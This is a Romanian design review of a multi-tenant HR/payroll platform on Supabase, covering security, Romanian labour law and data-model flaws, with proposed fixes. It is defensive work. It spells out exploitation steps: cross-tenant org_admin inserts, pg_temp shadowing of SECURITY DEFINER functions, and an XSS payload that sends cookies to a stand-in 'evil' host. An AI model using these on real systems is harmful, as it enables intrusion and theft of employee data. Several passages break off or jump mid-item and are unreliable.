## CRITICA: securitate
VERDICT: Designul are intentii corecte (RLS peste tot, matrice de permisiuni ca date, criptare aplicativa, audit), dar implementarea propusa contine cel putin sase gauri exploatabile imediat: o eroare de precedenta in WITH CHECK care permite oricui sa devina org_admin in orice firma, `scope='none'` interpretat ca permisiune acordata in wrapperul de Server Action, functii SECURITY DEFINER cu `search_path=public` vulnerabile la shadowing prin pg_temp, functii definer expuse anonim care primesc `organization_id` ca parametru, politici de Storage care verifica doar primul segment de path (deci orice coleg descarca fise medicale si cazier) si criptotextul CNP copiat in audit_logs de un trigger cu lista de excludere gresita. Peste toate se suprapune un drift sever intre documente (patru scheme de audit, trei definitii de `permission_scope`, doua surse de adevar pentru super_admin, `is_active` vs `status`), care face ca predicatele de securitate sa fie scrise pe coloane si functii inexistente — unele pica inchis, altele nu. Nu incepe implementarea inainte de a consolida un singur document canonic de schema si de a scrie testele RLS negative pentru fiecare punct de mai sus.
- [CRITIC] core-authz / RLS organization_members
  PROBLEMA: Politica `organization_members_insert` are precedenta de operatori gresita: `A and B and C and D and (seats_limit) is null OR (count(*) < seats_limit)`. In SQL `AND` leaga mai strans decat `OR`, deci intreaga clauza se reduce la `(...toate verificarile...) OR (count < seats_limit)`. A doua ramura, singura, satisface WITH CHECK. Scenariu: orice utilizator autentificat face din browser `supabase.from('organization_members').insert({organization_id: <org strain>, user_id: <eu>, role: 'org_admin', is_active: true})`; atat timp cat organizatia nu si-a atins seats_limit, insertul trece. Rezultat: acces complet + rol de administrator in orice firma-client. Toate celelalte politici (care se bazeaza pe `current_org_ids()` / `has_role`) devin inutile pentru ca atacatorul e acum membru legitim.
  CORECTIE: Parantezeaza explicit intreaga clauza de seats: `and ( (select o.seats_limit ...) is null or (select count(*) ...) < (select o.seats_limit ...) )`. Adauga un test RLS negativ dedicat (insert cross-tenant cu rol org_admin) si o regula de review: orice politica cu `OR` la nivelul de sus se parantezeaza obligatoriu. Prefera mutarea logicii de seats intr-un trigger BEFORE INSERT, unde nu poate fi neutralizata de precedenta.
- [CRITIC] app-arch-core / createAction + role_permissions
  PROBLEMA: `createAction` verifica doar existenta cheii: `const scope = permissions.get(def.permission); if (scope === undefined) return deny(...)`. Dar matricea contine randuri de REFUZ EXPLICIT cu scope `none` (seed-ul core-authz: manager x payroll read/create/update/delete/export = 'none', manager x audit_logs = 'none', hr x trip_sheets/vehicles/maintenance = 'none'). Acele randuri sunt returnate de `get_effective_permissions`, ajung in Map cu valoarea 'none', deci `scope !== undefined` si actiunea se executa. Scenariu: un manager apeleaza Server Action-ul de citire/export salarii; stratul de autorizare din aplicatie il lasa sa treaca, iar daca RLS-ul de pe `payroll_entries` esueaza sau e relaxat (vezi has_perm cu coloane inexistente), vede salariile intregii firme. Se adauga eroarea de enum: `permission_scope` e definit de trei ori diferit ('toate|echipa|proprii|niciunul' in core-schema, 'none|own|team|all' in core-authz, 'own|team|organization' in app-arch), deci `RANK[row.scope]` e `undefined` si `can()` da rezultate imprevizibile.
  CORECTIE: Trateaza 'none'/'niciunul' ca refuz: `if (scope === undefined || scope === 'none') return deny(...)`, plus `def.minScope` obligatoriu in definitia actiunii si comparatie pe rang. Unifica enumul `permission_scope` intr-o singura definitie SQL, genereaza tipul TS din `types/database.ts` si interzice literalele scrise de mana. Adauga test unitar: pentru fiecare rand cu scope 'none' din seed, actiunea corespunzatoare trebuie sa returneze INTERZIS.
- [CRITIC] attendance / payroll / ssm — functii SECURITY DEFINER
  PROBLEMA: `attendance_guard_business()`, `attendance_period_status_for()`, `attendance_guard_locked_period()`, `attendance_reopen_period()`, `attendance_audit_entry_status()`, `attendance_missing_alerts()`, `payroll_guard_attendance_finalized()`, `payroll_guard_period_open()`, `has_perm()`, `current_employee_id()`, `is_manager_of()` sunt declarate `security definer set search_path = public` si refera tabelele necalificat (`attendance_settings`, `employees`, `organization_members`, `role_permissions`). `pg_temp` este cautat implicit INAINTEA schemelor din search_path pentru tabele. Scenariu: un utilizator autentificat creeaza `create temp table role_permissions(...)` / `pg_temp.attendance_settings(...)` si, in aceeasi tranzactie, declanseaza triggerul; functia definer (rulata ca proprietar) citeste tabela lui temporara si intoarce ce vrea el: `has_perm` = true pentru orice, `attendance_period_status_for` = 'open' pentru o luna blocata, `max_daily_minutes` nelimitat. Autorizarea si blocarea perioadelor de pontaj/salarizare cad complet.
  CORECTIE: Toate functiile SECURITY DEFINER: `SET search_path = ''` (sau minim `pg_catalog, pg_temp` cu pg_temp ULTIMUL) si nume complet calificate `public.`/`auth.`/`extensions.`. Adauga un test de migrare care interogheaza `pg_proc` si esueaza daca exista vreo functie cu `prosecdef = true` si `proconfig` care nu contine `search_path=` gol/controlat.
- [CRITIC] Toate modulele — privilegii pe functii
  PROBLEMA: `revoke execute on all functions in schema public from public, anon` din core-authz se aplica O SINGURA DATA, la momentul acelei migrari. Toate functiile create ulterior (hr-core, attendance, leave, inventory/onboarding, expirari) primesc implicit `EXECUTE` pentru `PUBLIC`, deci si pentru `anon` si `authenticated`. Mai grav, mai multe dintre ele sunt `SECURITY DEFINER`, primesc `organization_id`/`entity_id` ca parametru si NU verifica apartenenta apelantului: `attendance_sync_auto_entries(p_org, p_from, p_to, p_employee_id)` (scriere de pontaje in orice organizatie), `team_subtree(p_manager_id)` (enumerarea arborelui de angajati din alt tenant), `app.sync_itemi_returnare_inventar(p_instance_id)` (scriere de itemi in checklistul altei firme), `expiry_upsert(org, ...)`, `hr_read_sensitive_bulk(uuid[])`. Scenariu: `POST /rest/v1/rpc/team_subtree {"p_manager_id": "<uuid ghicit sau aflat>"}` cu token de utilizator obisnuit → lista de id-uri de angajati din alta organizatie; `rpc/attendance_sync_auto_entries` cu un org strain → scriere cross-tenant.
  CORECTIE: In fiecare migrare care creeaza functii: `REVOKE EXECUTE ON FUNCTION ... FROM public, anon;` urmat de `GRANT` explicit doar catre `authenticated` acolo unde e nevoie; seteaza si `ALTER DEFAULT PRIVILEGES ... REVOKE EXECUTE ON FUNCTIONS FROM public`. Fiecare functie definer care primeste `organization_id` trebuie sa inceapa cu `if not public.is_member_of(p_org) and not public.is_platform_admin() then raise exception ...`. Functiile de job (sync, expiry_upsert, maintain_partitions) muta-le intr-o schema neexpusa prin PostgREST (`internal`), nu in `public`.
- [CRITIC] Storage — documente HR / concedii / inventar / diurna
  PROBLEMA: hr-core spune ca politica pe `storage.objects` „extrage organization_id din (storage.foldername(name))[1] si verifica apartenenta” — atat. Cu path `{organization_id}/{employee_id}/{uuid}.{ext}`, orice membru al organizatiei (inclusiv un `employee`) poate lista bucketul si descarca fisa de aptitudine medicala, cazierul, contractul cu salariu sau fluturasul altui coleg: `deleted_at`, `confidential`, `vizibil_angajatului` si permisiunea `hr.documents.read_all` din tabela de metadate NU exista in politica de Storage. In plus conventia de path e incalcata in trei module: leave foloseste `leave-documents/{org}/{request}` (3 segmente), inventar si diurna folosesc prefixul literal `org/<org_id>/...` — deci `can_access_object` (care face `try_uuid(v_parts[1])` si cere >= 4 segmente) refuza tot, iar bucketurile `hr-contracts`/`hr-documents`/`leave-documents` nici macar nu apar in lista de bucketuri creata in core-authz. Rezultatul practic: fie totul e blocat si cineva adauga „temporar” o politica permisiva pe folder[1], fie e deja deschis.
  CORECTIE: O singura conventie de path, primul segment intotdeauna `organization_id` uuid, al treilea `entity_id`, verificata printr-un CHECK pe coloana de path in tabelele de metadate. O singura functie `can_access_object` pentru toate bucketurile, extinsa sa consulte randul de metadate (`employee_documents.confidential`, `vizibil_angajatului`, `retentie`) inainte de a permite SELECT. Fara exceptii per-bucket. Test RLS obligatoriu: user din org A incearca `storage.objects` list+download pe un path complet cunoscut din org B si pe path-ul unui coleg cu document `confidential`.
- [CRITIC] core-authz tg_audit x hr-core employee_sensitive_data
  PROBLEMA: `attach_standard_triggers('employee_sensitive_data', array['cnp_encrypted','iban_encrypted'])` exclude coloane care NU exista: schema reala are `cnp_ciphertext`, `cnp_iv`, `cnp_auth_tag`, `cnp_hash`, `cnp_last4`, `iban_ciphertext`, `iban_iv`, `iban_auth_tag`, `key_version`. `to_jsonb(new) - v_exclude` nu elimina nimic, deci la fiecare INSERT/UPDATE criptotextul, IV-ul, auth tag-ul si HMAC-ul CNP-ului (`cnp_hash`) se copiaza integral in `audit_logs.after_data`, tabela citibila de orice `org_admin` si pastrata 3 ani + 2 ani arhiva in Storage. Consecinte: (1) crypto-shredding-ul promis la GDPR e inutil — stergerea randului din `employee_sensitive_data` lasa criptotextul complet in audit si in arhiva CSV; (2) `cnp_hash` expus permite verificare offline „acest CNP este angajat aici?” daca pepper-ul scapa vreodata; (3) o compromitere ulterioara a `HR_ENCRYPTION_KEYS` decripteaza si istoricul din audit. Acelasi tipar loveste `invitations` (exclude `token_hash` — acolo numele e corect, dar nimic nu verifica).
  CORECTIE: Nu atasa `tg_audit` generic pe `employee_sensitive_data`; auditul acelei tabele se face exclusiv din `hr_write_sensitive`/`hr_read_sensitive`, cu payload = doar numele coloanelor atinse. Adauga in `tg_audit` o lista globala de coloane interzise verificata la runtime (`ciphertext`, `iv`, `auth_tag`, `hash`, `token`, `secret`) plus un test de migrare care compara `tg_argv[0]` cu `information_schema.columns` si esueaza daca o coloana din lista de excludere nu exista. Verifica retroactiv arhivele deja exportate in `audit-archive`.
- [MARE] core-schema x core-authz — super_admin
  PROBLEMA: Exista doua surse de adevar pentru rolul de platforma: `profiles.is_platform_admin boolean` (core-schema, „singura sursa de adevar”) si tabela `public.platform_admins` (core-authz, citita de `is_platform_admin()`). Coloana de pe `profiles` este protejata DOAR de un trigger BEFORE UPDATE, in conditiile in care politica RLS permite `UPDATE` pe propriul profil. Scenariu: orice cale care ocoleste triggerul (o functie SECURITY DEFINER care face UPDATE, un job cu `service_role`, un `ALTER TABLE ... DISABLE TRIGGER` intr-o migrare de date, sau pur si simplu triggerul uitat intr-o migrare) transforma un utilizator obisnuit in administrator de platforma, cu bypass total de tenant. Acelasi tip de drift afecteaza predicatele de securitate: `organization_members.status` (core-schema) vs `m.is_active` (folosit de `current_org_ids()`, `has_role`, `is_member_of`), `organization_features.enabled` vs `f.is_enabled` in `org_has_feature()`, `role_permissions.permission/allowed` (payroll) vs `resource/action/scope` (core-authz) vs `permission_key/feature_key` (core-schema).
  CORECTIE: Elimina `profiles.is_platform_admin` complet; pastreaza doar `platform_admins`, fara nicio politica RLS, administrata exclusiv prin `service_role` si cu audit obligatoriu la fiecare grant. Inainte de orice implementare, consolideaza schema intr-un singur document canonic si genereaza toate helperele (`is_member_of`, `has_permission`, `org_has_feature`) o singura data, din acel document; adauga in CI un test care ruleaza `EXPLAIN` pe fiecare politica RLS (o coloana inexistenta pica imediat).
- [MARE] leave / per_diem / maintenance — WITH CHECK incomplet
  PROBLEMA: Aplicatia expune anon key + PostgREST catre browser, deci orice invariant impus doar in Server Action nu exista. `leave_requests` are `INSERT = employee_id = current_employee_id()` fara nicio restrictie pe `status`, `working_days`, `zile_din_reportate`. Scenariu: angajatul face din consola browserului `insert({employee_id: <al lui>, leave_type_id: ..., status: 'aprobata', working_days: 20, ...})` → concediu auto-aprobat, care apare in calendar, in `leave_request_days`, prepopuleaza pontajul automat prin `attendance_sync_auto_entries` si nu scade niciodata soldul (soldul se misca doar din Server Action). Acelasi tipar: `business_trips` INSERT „angajatul pentru el insusi” fara constrangere de `status`/`suma_diurna_ron` → deplasare inserata direct cu `status='decontat'`, care declanseaza triggerul ce creeaza `payroll_bonuses`; `fault_reports` INSERT nu impune `raportor_employee_id = current_employee_id`. Vector inrudit: `/api/export/[entity]/route.ts` primeste numele entitatii din URL fara lista alba — daca handlerul foloseste clientul admin pentru streaming (tipic la export-uri mari), `GET /api/export/employee_sensitive_data` sau `/api/export/audit_logs` livreaza tot.
  CORECTIE: Fiecare politica INSERT/UPDATE trebuie sa fixeze in WITH CHECK toate coloanele de stare si toate valorile calculate: `status = 'draft'`, `working_days = 0`, `approved_by is null`, `submitted_at is null`; valorile derivate se completeaza exclusiv prin trigger BEFORE (recalculate server-side, ignorand ce trimite clientul), nu prin Server Action. Pentru `/api/export/[entity]` — enum inchis de entitati permise, mapare entitate→permisiune, si interdictie de client admin pe ruta.
- [MARE] Feature flags — principiul 4
  PROBLEMA: Verificarea modulului exista in `buildNavigation` (UI), in `requireFeature` (RSC) si in `createAction` (`def.feature`), dar politicile RLS ale majoritatii modulelor NU o contin: attendance, leave, hr-core, inventory, onboarding, announcements, approvals nu apeleaza `feature_on()`/`org_has_feature()` in `USING`/`WITH CHECK` (doar fleet, ssm si payroll o fac partial). Scenariu: o firma pe planul `start` are `payroll` si `per_diem` dezactivate; orice angajat cu token valid apeleaza direct `GET /rest/v1/leave_balances`, `POST /rest/v1/attendance_entries` sau citeste tabele ale modulelor neplatite — RLS le permite pentru ca singura conditie e apartenenta + permisiune. In plus `org_has_feature()` trateaza doar literalul `'nucleu'`, ignorand `features.is_core`, si citeste coloanele `f.feature`/`f.is_enabled` care in core-schema se numesc `feature_key`/`enabled`.
  CORECTIE: Adauga `and public.org_has_feature(organization_id, '<modul>')` in TOATE politicile tabelelor modulare (SELECT inclusiv), cu functia marcata STABLE si apelata ca `(select ...)` acolo unde argumentul e constant. Corecteaza `org_has_feature` sa consulte `features.is_core` si numele reale de coloane. Extinde testul automat de izolare: pentru fiecare tabela cu feature asociat, dezactiveaza modulul si verifica ca SELECT/INSERT intorc 0 randuri / 42501.
- [MARE] leave / announcements / org_calendar_days — current_org_id()
  PROBLEMA: Zeci de politici folosesc `organization_id = current_org_id()` (leave_types, leave_requests, leave_request_days, organization_holidays, org_calendar_days, approval_flows/steps, announcements, announcement_targets) ca UNIC predicat de izolare, dar functia nu este definita nicaieri in design. Singurul concept de „organizatie activa” din arhitectura este cookie-ul `adm_org` semnat HMAC, adica o valoare care vine din request. Daca `current_org_id()` ajunge sa citeasca acea valoare (prin GUC/claim/`profiles.last_organization_id`, coloana pe care utilizatorul o poate scrie singur prin politica de UPDATE pe propriul profil), atunci `organization_id` vine efectiv de la client si un singur token modificat da acces la datele altei firme — exact interdictia din principiul 2. Chiar si in varianta „benigna”, o valoare unica de organizatie activa nu poate exprima corect un utilizator membru in mai multe organizatii si duce la politici care nu mai valideaza apartenenta la momentul executiei.
  CORECTIE: Elimina `current_org_id()` din orice politica RLS. Predicatul canonic devine `organization_id = ANY((select public.current_org_ids()))`, unde `current_org_ids()` este derivata exclusiv din `auth.uid()` + `organization_members` activ. Organizatia activa ramane strict un filtru de prezentare aplicat in `lib/queries/*`, niciodata in DB. Adauga o regula de lint pe fisierele de migrare care respinge textul `current_org_id()`.
- [MARE] core-authz — accept_invitation
  PROBLEMA: Functia compara `lower(v_inv.email) = lower(u.email)` dar nu verifica `u.email_confirmed_at is not null`. Daca in proiectul Supabase confirmarea de email este dezactivata sau exista o cale de signup cu email arbitrar (inclusiv `updateUser({email})` neconfirmat, in functie de setari), atacatorul isi seteaza adresa tintei si accepta o invitatie emisa pentru rolul `org_admin` → preluarea organizatiei. Al doilea defect: `on conflict (organization_id, user_id) where deleted_at is null do update set role = excluded.role, is_active = true, deleted_at = null` reinvie o apartenenta dezactivata/soft-deleted si suprascrie rolul curent — o invitatie veche, neexpirata si nerevocata, emisa cand persoana era angajata, o repune in organizatie dupa offboarding, ocolind procedura de plecare si controlul „ultimul org_admin”. Al treilea: functia nu reverifica daca emitentul mai are dreptul de invitare la momentul acceptarii, iar `peek_invitation` (acordat lui `anon`) returneaza emailul si numele firmei chiar si pentru invitatii revocate sau deja acceptate.
  CORECTIE: Adauga in `accept_invitation`: `if u.email_confirmed_at is null then raise exception 'EMAIL_NECONFIRMAT'`, verificarea ca invitatia nu a fost emisa de un utilizator care intre timp a pierdut dreptul, si refuzul explicit daca exista deja un rand cu `deleted_at is not null` (cere reinrolare manuala din UI, nu resurectie automata). `peek_invitation` sa intoarca doar `{organization_name, expired}` — niciodata emailul — si sa fie rate-limitata pe IP.
- [MARE] hr-core / ssm-maintenance — view-uri
  PROBLEMA: Doar view-urile de rapoarte din ssm-maintenance sunt declarate `security_invoker = on`. `employees_safe` (hr-core, expune `cnp_last4`), `v_employee_fitness` (ssm-maintenance, expune aptitudinea medicala) si eventualele view-uri de dashboard nu au flagul specificat. Default-ul in PostgreSQL este `security_invoker = false`, iar in Supabase view-urile se creeaza ca `postgres` (BYPASSRLS): `select * from employees_safe` returneaza angajatii TUTUROR organizatiilor, cu ultimele 4 cifre de CNP, pentru orice utilizator autentificat, fara nicio eroare vizibila. Testul de izolare propus in app-arch-ui-test nu prinde asta: `discoverTables()` filtreaza `c.relkind = 'r'`, deci view-urile (`relkind = 'v'`/`'m'`) nu sunt niciodata testate. In plus, ssm-maintenance mentioneaza posibilitatea unui matview de snapshot — matview NU suporta `security_invoker` deloc.
  CORECTIE: `security_invoker = true` obligatoriu pe fiecare view, verificat printr-un test care interogheaza `pg_class.reloptions` pentru toate `relkind in ('v')` din `public` si esueaza daca lipseste. Extinde `discoverTables()` la view-uri si ruleaza pe ele acelasi test de scurgere cross-tenant. Interzice `MATERIALIZED VIEW` pe date multi-tenant; foloseste tabela reala cu RLS reimprospatata de cron.
- [MARE] expirables-fleet — registrul comun de expirari
  PROBLEMA: `expirables` denormalizeaza randuri din SSM, medicina muncii si documentele de personal (`entity_type` include `medical_exam`, `ssm_training`, `employee_document`) cu `label` „gata de afisat” (tipic: nume angajat + tip document) si `reference_code`, dar are o singura permisiune de citire: `compliance.read`. Sursa reala are protectie mult mai stricta — `occupational_health_exams` cere `ssm.medical.read`, `employee_documents` cere `hr.documents.read_all` si respecta `confidential`. Scenariu: un responsabil de flota, caruia i s-a dat `compliance.read` ca sa vada ITP/RCA, deschide dashboardul de conformitate si vede „Fisa de aptitudine · Popescu Ion · expira 12.03.2026” pentru toata firma — date de sanatate, art. 9 GDPR, plus expirari de cazier/permis. Aceeasi problema la `compliance_alerts` (copiaza `kind`, `entity_type`, `responsible_id`) si la `alert_notifications.recipient_email`.
  CORECTIE: Politica de SELECT pe `expirables`/`compliance_alerts` trebuie sa reevalueze permisiunea sursei: `case entity_type when 'medical_exam' then has_perm(org,'ssm.medical.read') when 'employee_document' then has_perm(org,'hr.documents.read_all') else has_perm(org,'compliance.read') end` (indexabil daca pui `entity_type` pe prima pozitie in index). Pentru datele de sanatate publica in registru doar un `label` anonimizat (`Fisa de aptitudine · marca 0142`) si nicio informatie clinica; numele se rezolva la afisare, cu permisiunea corecta.
- [MARE] inventory-onboarding-announcements — anunturi
  PROBLEMA: `continut_html` se sanitizeaza „server-side la scriere”, in Server Action, si se randeaza cu `dangerouslySetInnerHTML`. Dar `announcements` are politica `announcements_write_redactori FOR ALL` pentru orice utilizator cu `announcements.manage`, deci scrierea directa prin PostgREST (`POST /rest/v1/announcements`) ocoleste complet sanitizatorul. Scenariu: un `hr` sau un `org_admin` compromis (sau un manager caruia i s-a acordat `announcements.manage` pe departament) insereaza direct un anunt cu `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>` sau cu un formular de phishing; anuntul este livrat intregii organizatii, inclusiv altor `org_admin`, si se executa in sesiunea lor. Cookie-urile Supabase sunt httpOnly, dar atacantul poate face cereri autentificate in numele victimei (inclusiv `rpc/hr_read_sensitive`), deci este escaladare completa in interiorul tenantului. `notifications.link` si `announcements` mai au si `CHECK(link ~ '^/')`, care accepta `//evil.com` — URL protocol-relativ, deci redirect deschis din email si din UI.
  CORECTIE: Sanitizeaza la RANDARE, nu doar la scriere (sau in ambele locuri), si adauga un trigger BEFORE INSERT/UPDATE care respinge `continut_html` cu taguri/atribute in afara listei albe. Serveste anuntul cu o politica CSP stricta (fara `unsafe-inline`) si prefera stocarea unui format structurat (markdown restrans / JSON de blocuri) in loc de HTML brut. Inlocuieste CHECK-ul de link cu `link ~ '^/[^/\\]'`.
- [MARE] Autentificare / invitatii — rate limiting
  PROBLEMA: Rate limiting apare o singura data in tot designul: `publicAction` pentru „Cere demo”, implementat in `lib/utils/rate-limit.ts` (in-memory, deci inutil pe runtime serverless cu instante multiple). Nu exista nicio limitare sau blocare pe: autentificare (`/autentificare`), resetare parola, re-trimitere invitatie (`sent_count <= 10` e o limita de total, nu de rata), `rpc/peek_invitation` (acordat explicit lui `anon`), `rpc/accept_invitation`, si nici pe formularul de invitatii (un org_admin poate trimite mii de emailuri prin Resend din domeniul firmei → abuz de reputatie). `peek_invitation` este un oracol public: primeste un token si intoarce email + denumire firma, fara limita si fara log. Resetarea de parola fara raspuns uniform permite enumerarea conturilor.
  CORECTIE: Rate limit persistent (tabela Postgres cu fereastra glisanta sau Upstash/Redis), aplicat pe IP + pe identificator, la: login, magic link, resetare parola, `peek_invitation`, `accept_invitation`, trimitere/retrimitere invitatie, formular demo. Lockout progresiv dupa N esecuri pe cont, cu scriere in `audit_logs` (`autentificare` esuata). Raspuns identic si timp constant pentru „email inexistent” vs „email existent”. Activeaza si limitele native Supabase Auth (attack protection / captcha).
- [MEDIU] Scurgere de date sensibile prin loguri, audit si payload RSC

## CRITICA: legal-ro
VERDICT: Designul este remarcabil de solid ca inginerie de date (RLS, izolare multi-tenant, versionarea configurărilor, criptarea datelor sensibile, auditul la citire) și respectă disciplinat principiul „nicio valoare legală hardcodată” — cu două excepții notabile (rotunjirea acumulării CO și absența unor plafoane). Slăbiciunea reală nu este în modelare, ci în ACOPERIREA legală: lipsesc REVISAL, registrele SSM (accidente, evaluarea riscurilor, plan de prevenire), autorizațiile ISCIR și cele nominale ale personalului deservent, sporurile permanente contractuale, mecanica concediului medical (coduri, split angajator/FNUASS, bază de calcul) și documentele HR obligatorii (fișa postului, informarea art. 17, statul de plată, adeverințele) — adică exact ce cere o firmă românească reală în prima lună de folosire. (2) Mută unicitatea de la `(organization_id, user_id)` la nivel de contract și permite mai multe fișe/contracte active per persoană, cu validarea că suma normelor nu depășește limita legală (configurabilă). `current_employee_id(org)` trebuie atunci să întoarce fișa „principală” explicit marcată, altfel RLS-ul devine ambiguu.

- [MEDIU] leave — acumularea concediului de odihnă
  PROBLEMA: Formula de acumulare hardcodează rotunjirea: `drept_acumulat = ceil(drept_brut * 2) / 2`, justificată în design ca „practica standard în RO și singura care nu produce reclamații”. Nu există însă o regulă legală de rotunjire a concediului proporțional — este o chestiune de contract colectiv/regulament intern, iar unele firme rotunjesc la zi întreagă, altele la 0,5, altele păstrează fracțiuni. Aceasta încalcă direct principiul nenegociabil 7 („nicio valoare legală/fiscală hardcodată”). Același lucru la reportare: termenul de 18 luni apare ca `termen_reportare_luni` configurabil (corect), dar regula „reportate(AN+1) = ramase(AN)” integral este hardcodată în job, deși unele firme reportează doar o parte. Funcția de acumulare devine pură și parametrizată, testată cu tabel de cazuri pentru fiecare mod. Păstrează `drept_brut` la 4 zecimale în `leave_accruals.motiv` (deja prevăzut — bine) ca sursă pentru recalculul retroactiv la schimbarea regulii.
- [MEDIU] payroll — cuplarea rigidă cu pontajul și CHECK-ul de zile
  PROBLEMA: Două probleme care se manifestă la primul stat de plată real: (1) `payroll_guard_attendance_finalized` refuză trecerea perioadei de salarii în `calculat` dacă există ORICE cerere de concediu cu status `in_asteptare` care se suprapune peste lună, sau orice pontaj neaprobat. Un singur manager plecat în concediu, cu o cerere nedecisă, blochează statul de plată al întregii firme — iar plata cu întârziere a salariilor este ea însăși o încălcare a Codului Muncii și o cauză frecventă de litigii. Blocajul absolut transformă o regulă de igienă a datelor într-un risc legal mai mare decât cel pe care îl previne. (2) `payroll_entries` are `CHECK (zile_lucrate + zile_concediu + zile_absente <= zile_lucratoare_luna + 0.01)` — fals pentru orice firmă cu muncă în schimburi, weekend sau sărbători legale, unde zilele efectiv lucrate depășesc numărul de zile lucrătoare din calendarul standard. O firmă de pază sau o brutărie nu poate salva niciun rând de salarii.
  CORECTIE: (1) Transformă blocajul în două praguri configurabile: `blocheaza_la_pontaj_neaprobat` (implicit da) și `blocheaza_la_concedii_in_asteptare` (implicit NU — avertisment vizibil cu lista cererilor, plus posibilitatea de a le decide în bloc din ecranul de salarii). (2) Elimină CHECK-ul sau înlocuiește-l cu `zile_concediu + zile_absente <= zile_lucratoare_luna` și o validare separată, neblocantă, care semnalează în `calc_warnings` când `zile_lucrate > zile_lucratoare_luna` (situație legitimă, dar care merită verificată).
- [MEDIU] payroll-perdiem — detașare transnațională
  PROBLEMA: Modulul de diurne cunoaște doar `per_diem_scope: intern | extern` și tratează orice deplasare în străinătate ca delegare cu diurnă din baremul HG 518/1995. Detașarea transnațională a salariaților în cadrul prestării de servicii în UE (Legea 16/2017, transpunând directivele privind detașarea) este un regim complet diferit: salariatul are dreptul la condițiile de muncă și la salariul minim din statul gazdă, angajatorul are obligații de declarare prealabilă în statul gazdă și de desemnare a unei persoane de legătură, iar „indemnizația specifică detașării transnaționale” are alt tratament fiscal decât diurna de delegare (inclusiv regula privind partea considerată rambursare de cheltuieli vs. parte a salariului). Publicul-țintă (construcții, transport, montaj) va lovi asta imediat. Scenariu: o echipă de 8 montatori pleacă 3 luni în Germania; sistemul le calculează diurnă din barem, firma nu declară detașarea, nu compară cu salariul minim german — risc de sancțiuni în statul gazdă și de recalificare fiscală în România.
  CORECTIE: Adaugă în enum `per_diem_scope` valoarea `detasare_transnationala` și, pe `business_trips`, câmpurile aferente: `stat_gazda`, `declaratie_prealabila_numar`, `declaratie_prealabila_data`, `persoana_de_legatura`, `salariu_minim_stat_gazda`, `indemnizatie_detasare`. Politica de plafonare devine un al treilea `per_diem_ceiling_rule` dedicat, cu valorile de verificat cu contabil/jurist. Validare blocantă la aprobare: peste o durată configurabilă și pentru deplasările marcate `detasare_transnationala`, cere completarea declarației prealabile. Chiar dacă implementarea completă se amână, ENUM-ul și câmpurile trebuie să existe de la început — altfel toate datele istorice se încadrează greșit ca delegare.
- [MEDIU] core-schema / GDPR — audit, retenție, minimizare
  PROBLEMA: Designul rezolvă bine partea grea (criptare CNP/IBAN, crypto-shredding, `retention_policies` configurabile, `anonimizat_la`), dar rămân trei tensiuni nerezolvate între dreptul la ștergere și obligația de arhivare. Mecanismul trebuie să fie el însuși auditat. (2) Seed obligatoriu de `retention_policies` la crearea organizației, cu ordinele de mărime uzuale marcate explicit ca „de validat de juristul/arhivarul clientului” — și un job care ALERTEAZĂ dacă o entitate nu are politică, în loc să tacă. ## CRITICA: model-date
VERDICT: Designul are calitate conceptuală remarcabilă pe bucăți (partiționarea auditului, registrul unic de expirări, EXCLUDE-ul pe alocări de inventar, snapshot-ul de setări pe fluturaș, argumentația InitPlan), dar ca schemă unică nu se poate deploya: nucleul de autorizare este definit de trei ori incompatibil, aproximativ zece CHECK-uri și un index unic folosesc expresii non-immutable și eșuează la migrare, iar politica de INSERT pe organization_members are un bug de precedență AND/OR care permite oricărui utilizator autentificat să se adauge ca org_admin într-un tenant străin. Cea mai profundă problemă structurală este că jumătate din module scriu RLS cu helperi fără parametru de organizație (current_org_id(), is_hr(), current_employee_id()), reintroducând exact presupunerea „un user = o organizație" pe care decizia de arhitectură o interzice explicit. Recomand o migrare canonică de nucleu plus jobul CI care aplică toate migrările pe o bază goală înainte de a scrie o singură linie de modul — ar fi prins peste jumătate din constatări la primul PR.
- [CRITIC] RLS — organization_members_insert (core-authz §5.1)
  PROBLEMA: Politica are bug de precedență a operatorilor. Clauza este `... and has_permission(...) ... and (select o.seats_limit ...) is null or (select count(*) ...) < (select o.seats_limit ...)`. În SQL `AND` leagă mai strâns decât `OR`, deci WITH CHECK se reduce la `(toate verificările AND seats_limit IS NULL) OR (count < seats_limit)`. Cum `seats_limit` este `NOT NULL DEFAULT 10`, prima ramură e mereu falsă și rămâne doar a doua: ORICE utilizator autentificat poate insera un rând în `organization_members` pentru ORICE organizație care nu și-a atins limita de locuri, cu ce rol dorește — escaladare completă într-un tenant străin, cu ocolirea inclusiv a verificării `role <> 'super_admin'`. Suplimentar, `select count(*) from organization_members m2 where m2.organization_id = organization_members.organization_id` este un subselect pe propria tabelă scris chiar în politica ei → `42P17 infinite recursion detected in policy`, exact capcana descrisă în §3 a aceluiași document.
  CORECTIE: Scoate complet numărarea locurilor din politică. Politica păstrează doar apartenența (`organization_id = any((select current_org_ids()))`), `has_permission(...,'users','create') in ('all','team')` și interdicțiile de escaladare, toate legate cu AND și parantezate explicit. `seats_limit` se impune într-un trigger `BEFORE INSERT/UPDATE` cu `SELECT seats_limit FROM organizations WHERE id = NEW.organization_id FOR UPDATE` — serializează și inserările concurente, lucru pe care o politică nu-l poate face oricum. Test de regresie obligatoriu: `employee` din org A încearcă INSERT cu `organization_id` = org B și `role='org_admin'` → trebuie 42501.
- [CRITIC] Contract de schemă — core-schema vs core-authz vs module
  PROBLEMA: Aceleași obiecte sunt definite de două-trei ori, incompatibil, deci nu există o singură migrare care să le satisfacă pe toate. (1) `permission_scope`: `toate|echipa|proprii|niciunul` (core-schema) vs `none|own|team|all` (core-authz) vs `own|team|organization` (app-arch, `get_effective_permissions`). (2) `role_permissions`: `permission_key citext + allowed boolean + feature_key` vs `resource + action + scope` fără `allowed` vs `rp.permission` + `rp.allowed` (payroll `has_perm`). (3) `organization_members`: `status member_status` (core-schema, hr-core, payroll) vs `is_active boolean` + `manager_member_id` + `department_id` (core-authz, folosite în `current_org_ids`, `is_manager_of`, `accept_invitation`). (4) super_admin: `profiles.is_platform_admin` declarat „singura sursă de adevăr" vs tabela separată `platform_admins` din care citește `is_platform_admin()`. (5) `organizations`: coloanele sunt `denumire/denumire_legala`, dar `GRANT UPDATE (name, legal_name, logo_path, primary_color, ...)` și `accept_invitation` (`select o.name`) referă coloane inexistente (brandingul e în `organization_branding`). Fiecare este eroare de migrare sau funcție care crapă la primul apel.
